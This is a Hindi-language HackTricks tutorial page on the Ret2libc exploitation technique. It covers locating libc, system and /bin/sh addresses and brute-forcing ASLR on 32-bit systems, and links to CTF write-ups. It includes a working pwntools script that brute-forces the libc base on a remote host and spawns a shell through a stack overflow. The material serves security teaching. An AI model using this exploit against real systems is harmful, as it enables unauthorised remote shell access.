# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **बुनियादी जानकारी**

**Ret2Libc** का सार यह है कि यह एक कमजोर प्रोग्राम के निष्पादन प्रवाह को एक साझा पुस्तकालय (जैसे, **system**, **execve**, **strcpy**) के भीतर एक फ़ंक्शन की ओर पुनर्निर्देशित करता है, बजाय इसके कि हमलावर द्वारा प्रदान किए गए शेलकोड को स्टैक पर निष्पादित किया जाए। हमलावर एक पेलोड तैयार करता है जो स्टैक पर लौटने के पते को उस पुस्तकालय फ़ंक्शन की ओर मोड़ता है, जबकि आवश्यक तर्कों को कॉलिंग कन्वेंशन के अनुसार सही तरीके से सेट करने की व्यवस्था भी करता है।

### **उदाहरण चरण (सरलित)**

- कॉल करने के लिए फ़ंक्शन का पता प्राप्त करें (जैसे system) और कॉल करने के लिए कमांड (जैसे /bin/sh)
- पहले तर्क को कमांड स्ट्रिंग की ओर इंगित करने और फ़ंक्शन के लिए निष्पादन प्रवाह को पास करने के लिए एक ROP श्रृंखला उत्पन्न करें

## पते खोजना

- मान लीजिए कि उपयोग की जाने वाली `libc` वर्तमान मशीन से है, आप यह पता लगा सकते हैं कि इसे मेमोरी में कहाँ लोड किया जाएगा:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
यदि आप यह जांचना चाहते हैं कि क्या ASLR libc के पते को बदल रहा है, तो आप कर सकते हैं:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- libc का उपयोग जानने से `system` फ़ंक्शन के लिए ऑफ़सेट ढूंढना भी संभव है:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- libc का उपयोग जानने से यह संभव है कि `/bin/sh` फ़ंक्शन के लिए ऑफ़सेट को इस तरह से खोजा जा सके:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF का उपयोग करना

libc का ज्ञान होने पर, Peda या GEF का उपयोग करके **system** फ़ंक्शन, **exit** फ़ंक्शन और स्ट्रिंग **`/bin/sh`** का पता लगाना भी संभव है:
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps का उपयोग करना

यदि प्रक्रिया हर बार जब आप इसके साथ बात करते हैं (नेटवर्क सर्वर) **बच्चे** बना रही है, तो उस फ़ाइल को **पढ़ने** की कोशिश करें (संभवतः आपको रूट होना पड़ेगा)।

यहाँ आप **सटीक रूप से देख सकते हैं कि libc प्रक्रिया के अंदर कहाँ लोड हो रहा है** और **प्रक्रिया के हर बच्चे के लिए कहाँ लोड होने वाला है**।

![](<../../../../images/image (95).png>)

इस मामले में यह **0xb75dc000** में लोड हो रहा है (यह libc का बेस पता होगा)

## अज्ञात libc

यह संभव है कि आप **नहीं जानते कि बाइनरी कौन सी libc लोड कर रहा है** (क्योंकि यह किसी सर्वर पर हो सकता है जहाँ आपके पास कोई पहुँच नहीं है)। उस मामले में आप **कुछ पते लीक करने के लिए भेद्यता का दुरुपयोग कर सकते हैं और पता लगा सकते हैं कि कौन सी libc** लाइब्रेरी का उपयोग किया जा रहा है:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

और आप इसके लिए एक pwntools टेम्पलेट यहाँ पा सकते हैं:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## 32 बिट्स में ASLR को बायपास करना

ये ब्रूट-फोर्सिंग हमले **केवल 32 बिट सिस्टम के लिए उपयोगी हैं**।

- यदि एक्सप्लॉइट स्थानीय है, तो आप libc के बेस पते को ब्रूट-फोर्स करने की कोशिश कर सकते हैं (32 बिट सिस्टम के लिए उपयोगी):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- यदि आप एक दूरस्थ सर्वर पर हमला कर रहे हैं, तो आप **`libc` फ़ंक्शन `usleep` के पते को बुरेट-फोर्स करने की कोशिश कर सकते हैं**, उदाहरण के लिए 10 को तर्क के रूप में पास करते हुए। यदि किसी बिंदु पर **सर्वर प्रतिक्रिया देने में 10 सेकंड अतिरिक्त लेता है**, तो आपने इस फ़ंक्शन का पता लगा लिया है।

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## x86 Ret2lib Code Example

इस उदाहरण में ASLR बुरेट-फोर्स को कोड में एकीकृत किया गया है और कमजोर बाइनरी एक दूरस्थ सर्वर पर स्थित है:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib कोड उदाहरण

उदाहरण देखें:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (या puts)

यह प्रक्रिया से **जानकारी लीक करने** की अनुमति देता है `printf`/`puts` को कुछ विशिष्ट डेटा को तर्क के रूप में कॉल करके।

## Ret2printf

इसका मतलब है **Ret2lib का दुरुपयोग करना ताकि इसे `printf` फॉर्मेट स्ट्रिंग्स भेद्यता में परिवर्तित किया जा सके** `ret2lib` का उपयोग करके printf को उन मानों के साथ कॉल करना जो इसे शोषित करते हैं (बेकार लग सकता है लेकिन संभव है):

{{#ref}}
../../format-strings/
{{#endref}}

## अन्य उदाहरण और संदर्भ

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, libc में एक फ़ंक्शन के पते को लीक करने के लिए, एक गेजेट का उपयोग करना
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 बिट, ASLR सक्षम लेकिन कोई PIE नहीं, पहला कदम ओवरफ्लो को भरना है जब तक कि कैनरी का बाइट 0x00 न हो जाए ताकि फिर puts को कॉल किया जा सके और इसे लीक किया जा सके। कैनरी के साथ एक ROP गेजेट बनाया जाता है जो puts को कॉल करता है ताकि GOT से puts का पता लीक किया जा सके और फिर `system('/bin/sh')` को कॉल करने के लिए एक ROP गेजेट।
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 बिट, ASLR सक्षम, कोई कैनरी नहीं, मुख्य से एक चाइल्ड फ़ंक्शन में स्टैक ओवरफ्लो। GOT से puts के पते को लीक करने के लिए puts को कॉल करने के लिए ROP गेजेट और फिर एक गेजेट को कॉल करें।
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 बिट, कोई pie नहीं, कोई कैनरी नहीं, कोई relro नहीं, nx। write फ़ंक्शन का उपयोग करके write (libc) के पते को लीक करता है और एक गेजेट को कॉल करता है।

{{#include ../../../../banners/hacktricks-training.md}}
